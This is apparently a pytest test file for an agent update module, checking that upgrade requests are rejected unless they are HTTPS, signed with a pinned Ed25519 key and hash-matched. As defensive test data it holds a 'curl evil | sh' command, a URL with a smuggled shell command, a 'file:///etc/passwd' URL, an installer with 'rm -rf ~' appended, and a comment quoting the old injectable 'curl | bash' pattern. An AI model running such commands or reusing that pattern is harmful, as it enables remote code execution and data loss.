import base64
import hashlib

import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

from src import agent_updates as au

INSTALLER = b"#!/bin/sh\necho upgraded\n"


@pytest.fixture
def keys():
    priv = Ed25519PrivateKey.generate()
    return priv, priv.public_key()


def signed_command(priv, payload=INSTALLER, **overrides):
    cmd = {
        "type": "upgrade",
        "download_url": "https://updates.example.com/install.sh",
        "sha256": hashlib.sha256(payload).hexdigest(),
        "signature": base64.b64encode(priv.sign(payload)).decode(),
        "target_version": "1.2",
    }
    cmd.update(overrides)
    return cmd


def test_install_command_rejected(keys):
    with pytest.raises(au.UpgradeRejected):
        au.validate_upgrade_request(signed_command(keys[0], install_command="curl evil | sh"))


@pytest.mark.parametrize("url", ["http://updates.example.com/i.sh", "file:///etc/passwd", "ftp://x/y", ""])
def test_non_https_rejected(keys, url):
    with pytest.raises(au.UpgradeRejected):
        au.validate_upgrade_request(signed_command(keys[0], download_url=url))


def test_quote_injection_url_is_not_executed(keys, monkeypatch):
    # The old agent built f"curl -fsSL '{url}' | bash" with shell=True.
    calls = []
    monkeypatch.setattr(au.subprocess, "Popen", lambda *a, **k: calls.append(a))
    monkeypatch.setattr(au, "_download", lambda url: b"tampered")
    cmd = signed_command(keys[0], download_url="https://x.example/'; touch /tmp/pwned; '")
    with pytest.raises(au.UpgradeRejected):
        au.apply_upgrade(cmd, keys[1])
    assert calls == []


def test_tampered_installer_rejected(keys, monkeypatch):
    calls = []
    monkeypatch.setattr(au.subprocess, "Popen", lambda *a, **k: calls.append(a))
    monkeypatch.setattr(au, "_download", lambda url: INSTALLER + b"rm -rf ~\n")
    with pytest.raises(au.UpgradeRejected, match="SHA-256"):
        au.apply_upgrade(signed_command(keys[0]), keys[1])
    assert calls == []


def test_wrong_key_rejected(keys, monkeypatch):
    attacker = Ed25519PrivateKey.generate()
    calls = []
    monkeypatch.setattr(au.subprocess, "Popen", lambda *a, **k: calls.append(a))
    monkeypatch.setattr(au, "_download", lambda url: INSTALLER)
    with pytest.raises(au.UpgradeRejected, match="signature"):
        au.apply_upgrade(signed_command(attacker), keys[1])
    assert calls == []


def test_missing_pinned_key_disables_upgrades(keys, monkeypatch):
    monkeypatch.delenv("TRON_UPDATE_PUBKEY", raising=False)
    with pytest.raises(au.UpgradeRejected, match="TRON_UPDATE_PUBKEY"):
        au.apply_upgrade(signed_command(keys[0]))


@pytest.mark.skipif(au.os.name != "posix", reason="POSIX only")
def test_valid_signed_installer_runs_with_fixed_argv(keys, monkeypatch):
    calls = []
    monkeypatch.setattr(au.subprocess, "Popen", lambda argv, **k: calls.append(argv))
    monkeypatch.setattr(au, "_download", lambda url: INSTALLER)
    pub = base64.b64encode(
        keys[1].public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    ).decode()
    monkeypatch.setenv("TRON_UPDATE_PUBKEY", pub)
    au.apply_upgrade(signed_command(keys[0]))
    assert len(calls) == 1 and calls[0][0] == "/bin/sh" and len(calls[0]) == 2
